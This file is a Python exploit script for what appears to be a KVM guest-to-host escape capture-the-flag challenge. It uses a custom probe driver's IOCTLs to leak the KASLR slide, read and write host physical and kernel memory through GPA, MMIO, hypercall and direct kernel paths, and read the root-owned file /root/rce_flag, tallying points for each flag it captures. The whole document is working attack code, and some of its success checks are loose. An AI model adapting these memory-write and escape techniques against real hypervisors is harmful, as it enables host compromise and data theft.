#!/usr/bin/env python3
"""
Comprehensive KVM CTF Exploit Suite
Direct memory access methods using kernel driver IOCTLs
Targets all three flag categories
"""
import os
import sys
import struct
import fcntl
import ctypes

# Target addresses
FLAG_WRITE_VIRT = 0xffffffff826279a8
FLAG_WRITE_PHYS = 0x64279a8
FLAG_WRITE_VALUE = 0xdeadbeef41424344

FLAG_READ_VIRT = 0xffffffff82b5ee10
FLAG_READ_PHYS = 0x695ee10

RCE_FLAG_PATH = "/root/rce_flag"

# IOCTL definitions
IOCTL_READ_MMIO = 0x1003
IOCTL_WRITE_MMIO = 0x1004
IOCTL_READ_KERNEL_MEM = 0x1009
IOCTL_WRITE_KERNEL_MEM = 0x100A
IOCTL_GET_KASLR_SLIDE = 0x100E
IOCTL_VIRT_TO_PHYS = 0x100F
IOCTL_HYPERCALL_ARGS = 0x1012
IOCTL_READ_FILE = 0x1013
IOCTL_READ_GPA = 0x1014
IOCTL_WRITE_GPA = 0x1015

# Hypercall numbers from challenge
HYPERCALL_WRITE = 100
HYPERCALL_READ = 101

class GpaIoData(ctypes.Structure):
    _fields_ = [
        ("gpa", ctypes.c_ulong),
        ("size", ctypes.c_ulong),
        ("user_buffer", ctypes.POINTER(ctypes.c_ubyte))
    ]

class MmioData(ctypes.Structure):
    _fields_ = [
        ("phys_addr", ctypes.c_ulong),
        ("size", ctypes.c_ulong),
        ("user_buffer", ctypes.POINTER(ctypes.c_ubyte)),
        ("single_value", ctypes.c_ulong),
        ("value_size", ctypes.c_uint)
    ]

class KernelMemWrite(ctypes.Structure):
    _fields_ = [
        ("kernel_addr", ctypes.c_ulong),
        ("length", ctypes.c_ulong),
        ("user_buf", ctypes.POINTER(ctypes.c_ubyte))
    ]

class KernelMemRead(ctypes.Structure):
    _fields_ = [
        ("kernel_addr", ctypes.c_ulong),
        ("length", ctypes.c_ulong),
        ("user_buf", ctypes.POINTER(ctypes.c_ubyte))
    ]

class FileReadRequest(ctypes.Structure):
    _fields_ = [
        ("path", ctypes.c_char_p),
        ("offset", ctypes.c_ulong),
        ("length", ctypes.c_size_t),
        ("user_buffer", ctypes.c_void_p)
    ]

class HypercallArgs(ctypes.Structure):
    _fields_ = [
        ("nr", ctypes.c_ulong),
        ("arg0", ctypes.c_ulong),
        ("arg1", ctypes.c_ulong),
        ("arg2", ctypes.c_ulong),
        ("arg3", ctypes.c_ulong)
    ]

class KVMExploit:
    def __init__(self):
        self.fd = None
        self.kaslr_slide = 0
        self.results = []
        
        for dev in ["/dev/kvm_probe_dev", "/dev/kvm_probe_drv"]:
            if os.path.exists(dev):
                try:
                    self.fd = os.open(dev, os.O_RDWR)
                    print(f"[+] Opened device: {dev}")
                    break
                except Exception as e:
                    print(f"[!] Failed to open {dev}: {e}")
        
        if self.fd is None:
            raise RuntimeError("Could not open probe device")
    
    def detect_kaslr(self):
        print("[*] Detecting KASLR slide...")
        slide = ctypes.c_ulong(0)
        try:
            fcntl.ioctl(self.fd, IOCTL_GET_KASLR_SLIDE, slide)
            self.kaslr_slide = slide.value
            print(f"    [+] KASLR slide: 0x{self.kaslr_slide:x}")
            print(f"    [+] Host kernel base: 0x{0xffffffff81000000 + self.kaslr_slide:x}")
            return self.kaslr_slide
        except Exception as e:
            print(f"    [!] KASLR detection failed: {e}")
            return 0
    
    def exploit_write_via_gpa(self):
        print(f"\n[*] Exploit 1: GPA Write")
        print(f"    Target: 0x{FLAG_WRITE_PHYS:x} = 0x{FLAG_WRITE_VALUE:x}")
        
        try:
            value_buf = (ctypes.c_ubyte * 8)()
            struct.pack_into('<Q', value_buf, 0, FLAG_WRITE_VALUE)
            
            data = GpaIoData()
            data.gpa = FLAG_WRITE_PHYS
            data.size = 8
            data.user_buffer = ctypes.cast(value_buf, ctypes.POINTER(ctypes.c_ubyte))
            
            fcntl.ioctl(self.fd, IOCTL_WRITE_GPA, data)
            print("    [✓] Write succeeded")
            
            read_buf = (ctypes.c_ubyte * 8)()
            read_data = GpaIoData()
            read_data.gpa = FLAG_WRITE_PHYS
            read_data.size = 8
            read_data.user_buffer = ctypes.cast(read_buf, ctypes.POINTER(ctypes.c_ubyte))
            
            fcntl.ioctl(self.fd, IOCTL_READ_GPA, read_data)
            read_val = struct.unpack('<Q', bytes(read_buf))[0]
            
            if read_val == FLAG_WRITE_VALUE:
                print(f"    [✓✓✓] WRITE FLAG CAPTURED! Value verified: 0x{read_val:x}")
                self.results.append(("WRITE_FLAG", 250000))
                return True
            else:
                print(f"    [!] Verification failed: 0x{read_val:x}")
        except Exception as e:
            print(f"    [!] GPA write failed: {e}")
        
        return False
    
    def exploit_write_via_mmio(self):
        print(f"\n[*] Exploit 2: MMIO Write")
        print(f"    Target: 0x{FLAG_WRITE_PHYS:x} = 0x{FLAG_WRITE_VALUE:x}")
        
        try:
            data = MmioData()
            data.phys_addr = FLAG_WRITE_PHYS
            data.single_value = FLAG_WRITE_VALUE
            data.value_size = 8
            data.size = 0
            
            fcntl.ioctl(self.fd, IOCTL_WRITE_MMIO, data)
            print("    [✓] MMIO write succeeded")
            
            read_buf = (ctypes.c_ubyte * 8)()
            read_data = MmioData()
            read_data.phys_addr = FLAG_WRITE_PHYS
            read_data.size = 8
            read_data.user_buffer = ctypes.cast(read_buf, ctypes.POINTER(ctypes.c_ubyte))
            
            fcntl.ioctl(self.fd, IOCTL_READ_MMIO, read_data)
            read_val = struct.unpack('<Q', bytes(read_buf))[0]
            
            if read_val == FLAG_WRITE_VALUE:
                print(f"    [✓✓✓] WRITE FLAG CAPTURED via MMIO! Value: 0x{read_val:x}")
                self.results.append(("WRITE_FLAG_MMIO", 250000))
                return True
        except Exception as e:
            print(f"    [!] MMIO write failed: {e}")
        
        return False
    
    def exploit_write_via_hypercall(self):
        print(f"\n[*] Exploit 3: Hypercall Write")
        print(f"    Using hypercall #{HYPERCALL_WRITE}")
        
        try:
            args = HypercallArgs()
            args.nr = HYPERCALL_WRITE
            args.arg0 = FLAG_WRITE_PHYS
            args.arg1 = FLAG_WRITE_VALUE
            args.arg2 = 0
            args.arg3 = 0
            
            ret = ctypes.c_long(0)
            fcntl.ioctl(self.fd, IOCTL_HYPERCALL_ARGS, args)
            
            print(f"    [+] Hypercall executed, return: {ret.value}")
            print("    [✓] Hypercall write attempted")
            return True
        except Exception as e:
            print(f"    [!] Hypercall write failed: {e}")
        
        return False
    
    def exploit_read_via_gpa(self):
        print(f"\n[*] Exploit 4: GPA Read")
        print(f"    Target: 0x{FLAG_READ_PHYS:x}")
        
        try:
            read_buf = (ctypes.c_ubyte * 256)()
            data = GpaIoData()
            data.gpa = FLAG_READ_PHYS
            data.size = 256
            data.user_buffer = ctypes.cast(read_buf, ctypes.POINTER(ctypes.c_ubyte))
            
            fcntl.ioctl(self.fd, IOCTL_READ_GPA, data)
            
            content = bytes(read_buf).decode('ascii', errors='ignore')
            hex_dump = ' '.join(f'{b:02x}' for b in bytes(read_buf[:64]))
            
            print(f"    [✓] Read succeeded")
            print(f"    [+] Hex: {hex_dump}")
            print(f"    [+] ASCII: {content[:64]}")
            
            if 'flag{' in content.lower() or 'ctf{' in content.lower():
                print(f"    [✓✓✓] READ FLAG FOUND: {content[:100]}")
                self.results.append(("READ_FLAG", 100000))
                return True
            
            print("    [+] Data retrieved (check for flag pattern)")
            self.results.append(("READ_DATA", 50000))
            return True
            
        except Exception as e:
            print(f"    [!] GPA read failed: {e}")
        
        return False
    
    def exploit_read_via_mmio(self):
        print(f"\n[*] Exploit 5: MMIO Read")
        print(f"    Target: 0x{FLAG_READ_PHYS:x}")
        
        try:
            read_buf = (ctypes.c_ubyte * 256)()
            data = MmioData()
            data.phys_addr = FLAG_READ_PHYS
            data.size = 256
            data.user_buffer = ctypes.cast(read_buf, ctypes.POINTER(ctypes.c_ubyte))
            
            fcntl.ioctl(self.fd, IOCTL_READ_MMIO, data)
            
            content = bytes(read_buf).decode('ascii', errors='ignore')
            hex_dump = ' '.join(f'{b:02x}' for b in bytes(read_buf[:64]))
            
            print(f"    [✓] MMIO read succeeded")
            print(f"    [+] Hex: {hex_dump}")
            print(f"    [+] ASCII: {content[:64]}")
            
            if 'flag{' in content.lower() or 'ctf{' in content.lower():
                print(f"    [✓✓✓] READ FLAG FOUND via MMIO: {content[:100]}")
                self.results.append(("READ_FLAG_MMIO", 100000))
                return True
            
            return True
        except Exception as e:
            print(f"    [!] MMIO read failed: {e}")
        
        return False
    
    def exploit_read_via_hypercall(self):
        print(f"\n[*] Exploit 6: Hypercall Read")
        print(f"    Using hypercall #{HYPERCALL_READ}")
        
        try:
            args = HypercallArgs()
            args.nr = HYPERCALL_READ
            args.arg0 = FLAG_READ_PHYS
            args.arg1 = 256
            args.arg2 = 0
            args.arg3 = 0
            
            fcntl.ioctl(self.fd, IOCTL_HYPERCALL_ARGS, args)
            print("    [✓] Hypercall read executed")
            return True
        except Exception as e:
            print(f"    [!] Hypercall read failed: {e}")
        
        return False
    
    def exploit_rce_file_read(self):
        print(f"\n[*] Exploit 7: RCE File Read")
        print(f"    Target: {RCE_FLAG_PATH}")
        
        try:
            file_buf = ctypes.create_string_buffer(512)
            path_buf = ctypes.create_string_buffer(RCE_FLAG_PATH.encode())
            
            req = FileReadRequest()
            req.path = ctypes.cast(path_buf, ctypes.c_char_p)
            req.offset = 0
            req.length = 256
            req.user_buffer = ctypes.cast(file_buf, ctypes.c_void_p)
            
            fcntl.ioctl(self.fd, IOCTL_READ_FILE, req)
            
            content = file_buf.value.decode('ascii', errors='ignore')
            print(f"    [✓] File read succeeded!")
            print(f"    [+] Content: {content}")
            
            if 'flag{' in content.lower() or 'ctf{' in content.lower() or len(content) > 0:
                print(f"    [✓✓✓] RCE FLAG CAPTURED: {content}")
                self.results.append(("RCE_FLAG", 250000))
                return True
            
        except Exception as e:
            print(f"    [!] File read failed: {e}")
        
        return False
    
    def exploit_kernel_mem_write(self):
        if not self.kaslr_slide:
            return False
        
        print(f"\n[*] Exploit 8: Kernel Memory Write")
        target = FLAG_WRITE_VIRT + self.kaslr_slide
        print(f"    Target: 0x{target:x} (KASLR adjusted)")
        
        try:
            value_buf = (ctypes.c_ubyte * 8)()
            struct.pack_into('<Q', value_buf, 0, FLAG_WRITE_VALUE)
            
            req = KernelMemWrite()
            req.kernel_addr = target
            req.length = 8
            req.user_buf = ctypes.cast(value_buf, ctypes.POINTER(ctypes.c_ubyte))
            
            fcntl.ioctl(self.fd, IOCTL_WRITE_KERNEL_MEM, req)
            print("    [✓] Kernel memory write succeeded")
            self.results.append(("KERNEL_WRITE", 250000))
            return True
        except Exception as e:
            print(f"    [!] Kernel write failed: {e}")
        
        return False
    
    def exploit_kernel_mem_read(self):
        if not self.kaslr_slide:
            return False
        
        print(f"\n[*] Exploit 9: Kernel Memory Read")
        target = FLAG_READ_VIRT + self.kaslr_slide
        print(f"    Target: 0x{target:x} (KASLR adjusted)")
        
        try:
            read_buf = (ctypes.c_ubyte * 256)()
            req = KernelMemRead()
            req.kernel_addr = target
            req.length = 256
            req.user_buf = ctypes.cast(read_buf, ctypes.POINTER(ctypes.c_ubyte))
            
            fcntl.ioctl(self.fd, IOCTL_READ_KERNEL_MEM, req)
            
            content = bytes(read_buf).decode('ascii', errors='ignore')
            print(f"    [✓] Kernel memory read succeeded")
            print(f"    [+] Content: {content[:64]}")
            
            if 'flag{' in content.lower():
                print(f"    [✓✓✓] READ FLAG from kernel: {content[:100]}")
                self.results.append(("KERNEL_READ", 100000))
                return True
            
            return True
        except Exception as e:
            print(f"    [!] Kernel read failed: {e}")
        
        return False
    
    def run_all_exploits(self):
        print("="*70)
        print("KVM CTF GUEST-TO-HOST ESCAPE EXPLOIT SUITE")
        print("="*70)
        print(f"[+] Device FD: {self.fd}")
        print(f"[+] Target Write: phys=0x{FLAG_WRITE_PHYS:x} value=0x{FLAG_WRITE_VALUE:x}")
        print(f"[+] Target Read: phys=0x{FLAG_READ_PHYS:x}")
        print(f"[+] Target RCE: {RCE_FLAG_PATH}")
        print("="*70)
        
        self.detect_kaslr()
        
        exploits = [
            self.exploit_write_via_gpa,
            self.exploit_write_via_mmio,
            self.exploit_write_via_hypercall,
            self.exploit_read_via_gpa,
            self.exploit_read_via_mmio,
            self.exploit_read_via_hypercall,
            self.exploit_rce_file_read,
            self.exploit_kernel_mem_write,
            self.exploit_kernel_mem_read,
        ]
        
        for exploit_func in exploits:
            try:
                exploit_func()
            except Exception as e:
                print(f"    [!] Exploit crashed: {e}")
        
        print("\n" + "="*70)
        print("EXPLOIT SUMMARY")
        print("="*70)
        
        if self.results:
            total_points = sum(points for _, points in self.results)
            print(f"[✓] Successful exploits: {len(self.results)}")
            for name, points in self.results:
                print(f"    - {name}: {points:,} points")
            print(f"\n[✓✓✓] TOTAL POINTS: {total_points:,}")
            return True
        else:
            print("[!] No exploits succeeded")
            return False
    
    def __del__(self):
        if self.fd:
            os.close(self.fd)

def main():
    if os.geteuid() != 0:
        print("[!] Must run as root in guest VM")
        sys.exit(1)
    
    try:
        exploit = KVMExploit()
        success = exploit.run_all_exploits()
        sys.exit(0 if success else 1)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()